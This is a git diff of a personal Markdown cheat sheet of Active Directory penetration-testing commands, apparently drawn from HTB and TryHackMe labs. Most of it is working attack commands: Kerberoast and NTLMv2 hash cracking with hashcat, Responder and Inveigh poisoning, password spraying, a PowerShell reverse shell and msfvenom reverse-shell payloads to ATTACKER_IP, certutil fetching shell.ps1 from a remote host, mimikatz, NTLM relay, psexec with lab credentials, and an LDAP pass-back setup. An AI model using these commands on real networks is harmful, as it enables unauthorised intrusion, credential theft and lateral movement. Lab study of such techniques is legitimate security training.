@@ -1,9 +1,21 @@
 # TOC
+- [Tools](#tools)
+- [Training](#training)
+- [OSINT](#osint)
 - [setup](#setup)
-- [RDP](#rdp)
-- [AD](#ad)
+- [Hashcat](#hashcat)
+- [John](#john)
 - [xfreerdp](#xfreerdp)
 - [remmina](#remmina)
+- [ssh](#ssh)
+- [socat](#socat)
+- [TFTP](#tftp)
+- [setspn](#setspn)
+- [rpcclinet](#rpcclient)
+- [crackmapexec](#crackmapexec)
+- [kerbrute](#kerbrute)
+- [impacket](#impacket)
+  - [GetUserSPNs.py](#getuserspnspy)
 
 ---
 
@@ -15,6 +27,22 @@ https://github.com/wavestone-cdt/powerpxe/tree/master
 https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/
 https://github.com/cube0x0/CVE-2021-1675/tree/main
 https://pypi.org/project/requests-ntlm/
+
+---
+
+# Traning
+## GOAD
+https://github.com/Orange-Cyberdefense/GOAD
+
+---
+
+# OSINT
+- https://haveibeenpwned.com/
+- https://www.dehashed.com/
+## spiderfoot
+https://github.com/smicallef/spiderfoot
+
+---
 
 # setup
 - impacket
@@ -40,6 +68,21 @@ https://remmina.org/how-to-install-remmina/
 ```zsh
 $ sudo apt install remmina remmina-plugin-rdp remmina-plugin-secret
 ```
+
+---
+
+# Hashcat
+tag: Misc
+```zsh
+$ hashcat -m 13100 bob_tgs /usr/share/wordlists/rockyou.txt
+$ hashcat -m 5600 era_ntlmv2 /usr/share/wordlists/rockyou.txt
+$ echo "backupagent::INLANEFREIGHT:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
+$ hashcat -m 5600 ./backupagent_hash /usr/share/wordlists/rockyou.txt
+$ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
+```
+
+# John
+tag: Misc
 
 # xfreerdp
 ```
@@ -89,9 +132,17 @@ $ sudo nmap -sV -p- 172.16.5.225
 $ fping -asgq 172.16.5.0/23
 ```
 
-# Responder
+# tcpdump  
+tag: Initial Enumeration  
 ```zsh
-$ sudo responder -I ens224 
+$ sudo tcpdump -i ens224
+```
+
+# Responder  
+tag: Initial Enumeration  
+```zsh
+$ sudo responder -I ens224 -A
+$ sudo responder -I ens224
 ```
 
 # ffuf
@@ -100,8 +151,10 @@ $ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
 ```
 
 # nc
+tag: LDAP Pass-back Attacks
 ```zsh
 $ sudo nc -lvnp LPORT
+$ nc -lvp 389
 ```
 
 # Windows Built-In
@@ -109,6 +162,23 @@ $ sudo nc -lvnp LPORT
 # one line
 PS> powershell -nop -c "powershell command; powershell command...;"
 PS> powershell -command "Start-Process -Verb runas cmd"
+# Enumerating Security Controls
+PS> Get-MpComputerStatus
+PS> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+PS> Find-LAPSDelegatedGroups
+PS> Find-AdmPwdExtendedRights
+PS> Get-LAPSComputers
+# create credential
+PS> $username = 'TestAdminUser'
+PS> $password = 'TestAdminPassword'
+PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+# access
+PS> New-PSSession -ComputerName TestHost.HOGE.com
+PS> Enter-PSSession -ComputerName TestHost.HOGE.com
+PS> Enter-PSSession -Computername TARGET -Credential $credential
+## or
+PS> Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
 # Reverse Shell
 PS> $client = New-Object System.Net.Sockets.TCPClient('XXX.XXX.XXX.XXX',RPORT);
 PS> $stream = $client.GetStream()
@@ -136,8 +206,22 @@ PS> Import-Module ActiveDirectory; $Password = ConvertTo-SecureString "New.Passw
 $ sc.exe \\TestHost/HOGE.com create TestService binPath= "%windir%\TestService.exe" start= auto
 ```
 
+## certutil.exe
+```powershell
+PS> certutil.exe -urlcache -split -f http://XXX.XXX.XXX.XXX:443/shell.ps1
+```
+
+## net.exe
+```zsh
+$ net use \\DC01\ipc$ "" /u:""
+$ net user %username%
+```
+
 # Metasploit
 ```zsh
+# Metasploit
+```zsh
+$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
 $ msfvenom -l payloads
 $ msfvenom -p java/jsp_shell_reverse_tcp --list-options
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > shell.war
@@ -258,10 +342,7 @@ $shareName = 'YourShareName'
 # Create a new shared folder
 New-SmbShare -Path $sharedFolderPath -Name $shareName -ReadAccess 'Everyone'
 
-#####
-# Specify the username and password for the new user
-$username = 'Jim'
-$password = ConvertTo-SecureString 'YourPassword' -AsPlainText -Force
+
 
 # Create a new local user
 New-LocalUser -Name $username -Password $password -FullName 'Jim' -Description 'Description of the new user' -AccountNeverExpires
@@ -358,9 +439,11 @@ https://en.wikipedia.org/wiki/Nessus_Attack_Scripting_Language
 https://www.pathname.com/fhs/
 
 
-# file index number  - inode
-```
-htb-student@nixfund:/etc$ stat sudoers
+# Linux Buit-In
+```zsh
+$ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
+# find index number - inode
+$ stat sudoers
   File: sudoers
   Size: 755             Blocks: 8          IO Block: 4096   regular file
 Device: 801h/2049d      Inode: 147627      Links: 1
@@ -369,37 +452,17 @@ Access: 2024-01-01 08:21:19.971766710 +0000
 Modify: 2018-01-18 00:08:16.000000000 +0000
 Change: 2021-08-03 12:08:36.494845988 +0000
  Birth: -
-htb-student@nixfund:/etc$ ls -i sudoers
+$ ls -i sudoers
 147627 sudoers
-htb-student@nixfund:/etc$
-```
-
-# find
-```zsh
-$ find / -name *.log 2>/dev/null | wc -l
-$ find / -name "*.bak" 2>/dev/null
-$ find / -name *.conf* -type f -size +25k -size -28k -newermt 2020-03-03 2>/dev/null
-```
-
-# apt, dpkg
-```zsh
-$ apt list --installed | wc -l
-$ dpkg -l
-$ dpkg -l | grep ^ii | wc -l
-```
-
-```zsh
-$ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
-```
-
 # column command
-column command might be useful for a dman diplay of volatility 3
-```zsh
+## column command might be useful for a dman diplay of volatility 3
 $ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t
 
 root         x  0     0      root               /root        /bin/bash
 sync         x  4     65534  sync               /bin         /bin/sync
 mrb3n        x  1000  1000   mrb3n              /home/mrb3n  /bin/bash
+
+
 ```
 
 # netstat and ss
@@ -424,45 +487,29 @@ As for the type of service, systemd categorizes services into different types, s
 
 systemctl show -p Type syslog.service
 
-# Hashcat
-```zsh
-$ echo "backupagent::INLANEFREIGHT:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
-$ hashcat -m 5600 ./backupagent_hash /usr/share/wordlists/rockyou.txt
-$ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
-```
-
-## Enumerating Users with Kerbrute
-### Kerbrute User Enumeration
-$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt
-
-$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt
-
-
-$ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@inlanefreight\.local//' > valid_users.txt
-
-
 
 # Internal Password Spraying - from Windows
 PS > Import-Module .\DomainPasswordSpray.ps1
 PS > Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
 
 # rpcclient
-# https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
-# https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration  
+https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/  
 ```zsh
+$ rpcclient -U "" -N XXX.XXX.XXX.XXX
+rpcclient $> querydominfo
+rpcclient $> enumdomusers
 $ rpcclient -U "" -N 172.16.5.5 -c "queryuser 1170"
 $ rpcclient -U "" -N 172.16.5.5 -c "enumdomgroups" > a.txt
 $ grep Intern a.txt
 group:[Interns] rid:[0xff0]
+$
 $ echo $((16#ff0))
 4080
-$ rpcclient -U "" -N XXX.XXX.XXX.XXX
-> querydominfo
-> getdompwinfo
+$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.0.10 | grep Authority; done
 ```
 
-
-## BloodHound  
+# BloodHound  
 ```powershell
 PS> .\SharpHound.exe -c All --zipfilename hoge
 PS> BloodHound.exe
@@ -471,15 +518,15 @@ PS> BloodHound.exe
 ## Check ... Analysis Tab
 ```
 
-## PowerView  
+# PowerView  
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 
-## Snaffer  
+# Snaffer  
 https://github.com/SnaffCon/Snaffler  
 ```powershell
 PS> Snaffler.exe -s -d hoge.local -o snaffler.log -v data
 ```
-## Dsquery  
+# Dsquery  
 https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)  
 ```powershell
 PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
@@ -487,32 +534,16 @@ PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.
 PS> dsquery * domainroot -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr description
 ```
 
-# keberoasting
-user: user1
-password: password1
+
+# Samba
+## smbclient
 ```zsh
-$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/user1
-[ENTER PASSWORD] password1
-``````
-```zsh
-# test
-$ sudo crackmapexec smb 172.16.5.5 -u SAPService_tgs -p !SapperFi2
--bash: !SapperFi2: event not found
-$
-$ set +H
-$ sudo crackmapexec smb 172.16.5.5 -u SAPService -p !SapperFi2 --groups
+$ smbclient -U TestUser -N XXX.XXX.XXX.xXX
 ```
 
-python3 windapsearch.py --dc-ip 172.16.5.5 -u SAPService@inlanefreight.local -p !SapperFi2 -PU
-
-
-net user %username%
-
-psexec.py inlanefreight.local/SAPService:'!SapperFi2'@172.16.5.5
-
-smbclient -U SAPService -N 172.16.5.5
-
 # smbmap
+https://github.com/ShawnDEvans/smbmap  
+SMB share enumeration across a domain. |  
 ```zsh
 $ smbmap -u hoge_user -p hoge_password -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
 ```
@@ -520,9 +551,10 @@ $ smbmap -u hoge_user -p hoge_password -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
 sudo bloodhound-python -u 'SAPService' -p 'SapperFi2' -ns 172.16.5.5 -d inlanefreight.local -c all
 
 # setspn
+https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
 ```powershell
 PS> setspn.exe -Q */*
-PS> setspn.exe -Q vmware/inlanefreight.local
+PS> setspn.exe -Q vmware/HOGE.com
 ```
 
 ## targeting single user
@@ -533,7 +565,7 @@ PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argum
 ```
 
 # mimikatz
-```
+```zsh
 PS> mimikatz.exe
 mimikatz # privilege::debug
 mimikatz# base64 /out:true
@@ -597,14 +629,10 @@ PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 
 
-powershell
-New-PSSession -ComputerName thmserver1.za.tryhackme.loc
-Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
 
 
 
-certutil.exe -urlcache -split -f http://10.50.31.110:443/shell.ps1
-
+# SpoolSample.exe
 SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.200.83.201"
 python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.83.201 -debug
 
@@ -618,3 +646,113 @@ $ Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Ser
 
 # SharpHound
 SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
+
+# LDAP Pass-back Attacks
+```zsh
+
+$ sudo dpkg-reconfigure -p low slapd
+```
+- olcSaslSecProps.ldif
+```
+#olcSaslSecProps.ldif
+dn: cn=config
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+```
+
+# Seatbelt
+https://github.com/GhostPack/Seatbelt
+
+# sslstrip
+https://github.com/moxie0/sslstrip
+
+# PowerSploit
+https://github.com/PowerShellMafia/PowerSploit
+
+# PsExec
+```powershell
+PS> psexec64.exe \\MACHINE_IP -u TestAdminUser -p TestAdminPassword -i cmd.exe
+```
+
+psexec.py inlanefreight.local/SAPService:'!SapperFi2'@172.16.5.5
+
+# WinRM
+```powershell
+PS> winrs.exe -u:TestAdminUser -p:TestAdminPassword -r:TargetIP_or_Hostname cmd
+```
+
+# Inveigh
+## powershell
+```powershell
+PS> Import-Module .\Inveigh.ps1
+PS> (Get-Command Invoke-Inveigh).Parameters
+PS> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+## c# exe
+```powershell
+PS> .\Inveigh.exe
+```
+
+# kerbrute
+tag: Enumerating Users
+```zsh
+$ sudo git clone https://github.com/ropnop/kerbrute.git
+$ make help
+$ sudo make all
+$ ls dist/
+$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+$ kerbrute userenum -d HOGE.com --dc 172.16.0.10 mylist.txt -o valid_ad_users
+$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt
+$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt
+$ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@inlanefreight\.local//' > valid_users.txt
+```
+
+# crackmapexec
+tag: Sighting In, Hunting For A User
+```zsh
+$ crackmapexec smb -h
+$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --pass-pol
+$ crackmapexec smb XXX.XXX.XXX.XXX --users
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword
+$ set +H
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --groups
+```
+
+# enum4linux
+```zsh
+$ enum4linux -P XXX.XXX.XXX.XXX
+$ enum4linux -U XXX.XXX.XXX.XXX | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+# enum4linux-ng
+```zsh
+$ enum4linux-ng -P 172.16.0.10 -oA my_output
+$ cat my_output.json
+```
+
+# ldapsearch
+```zsh
+$ ldapsearch -h 172.16.0.10 -x -b "DC=HOGE,DC=COM" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+# windapsearch
+```zsh
+$ ;/windapsearch.py -h
+$ ./windapsearch.py --dc-ip 172.16.0.10 -u "" -U
+$ python3 windapsearch.py --dc-ip 172.16.5.5 -u TestSpnAccountUser -p TestSpnAccountPassword -PU
+```
+
+# impacket
+## GetUserSPNs.py
+```zsh
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo r-request
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
+# -> Hashcat
+```
+
+# noPac
+```zsh
+$ git clone https://github.com/Ridter/noPac
+```
